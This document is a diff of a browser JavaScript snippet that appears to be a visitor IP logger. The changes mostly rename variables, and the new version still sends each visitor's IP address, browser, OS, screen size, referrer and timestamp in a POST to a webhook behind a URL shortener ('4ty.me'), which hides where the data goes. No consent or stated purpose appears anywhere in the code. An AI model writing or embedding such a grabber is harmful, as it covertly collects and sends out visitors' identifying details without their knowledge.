@@ -30,53 +30,63 @@
 
             function getUA() {
                 const ua = navigator.userAgent;
-                let br = 'UB';  // Unknown Browser
-                let os = 'UO';  // Unknown OS
+                let browser = 'Unknown Browser';
+                let os = 'Unknown OS';
 
                 if (ua.includes('Firefox')) {
-                    br = 'MF';
+                    browser = 'Mozilla Firefox';
                 } else if (ua.includes('Chrome')) {
-                    br = 'GC';
+                    browser = 'Google Chrome';
                 } else if (ua.includes('Safari')) {
-                    br = 'SF';
+                    browser = 'Safari';
                 } else if (ua.includes('MSIE') || ua.includes('Trident')) {
-                    br = 'IE';
+                    browser = 'Internet Explorer';
                 } else if (ua.includes('Opera') || ua.includes('OPR')) {
-                    br = 'OP';
+                    browser = 'Opera';
                 }
 
                 if (ua.includes('Windows NT 10.0')) {
-                    os = 'W10';
+                    os = 'Windows 10';
                 } else if (ua.includes('Mac OS X')) {
-                    os = 'Mac';
+                    os = 'Mac OS X';
                 } else if (ua.includes('Linux')) {
-                    os = 'Lin';
+                    os = 'Linux';
                 } else if (ua.includes('Android')) {
-                    os = 'And';
+                    os = 'Android';
                 } else if (ua.includes('iPhone')) {
-                    os = 'iOS (iP)';
+                    os = 'iOS (iPhone)';
                 } else if (ua.includes('iPad')) {
-                    os = 'iOS (iPd)';
+                    os = 'iOS (iPad)';
                 }
 
-                return { br, os };
+                return { browser, os };
             }
 
             async function sendInfo() {
                 const ip = await getIP();
-                const { br, os } = getUA();
-                const sw = screen.width;
-                const sh = screen.height;
-                const rf = document.referrer || 'Direct';
-                const ts = new Date().toISOString();
+                const { browser, os } = getUA();
+                const screenWidth = screen.width;
+                const screenHeight = screen.height;
+                const referrer = document.referrer || 'Direct';
+                const timestamp = new Date().toISOString();
 
-                const data = { ip, br, os, sw, sh, rf, ts };
+                const data = {
+                    ip: ip,
+                    browser: browser,
+                    os: os,
+                    screenWidth: screenWidth,
+                    screenHeight: screenHeight,
+                    referrer: referrer,
+                    timestamp: timestamp
+                };
 
-                const url = 'https://tinyurl.com/ye8m429u';
+                const webhookURL = 'http://4ty.me/7mjnbx'; // Shortened URL
 
-                fetch(url, {
+                fetch(webhookURL, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({ content: JSON.stringify(data) })
                 });
             }
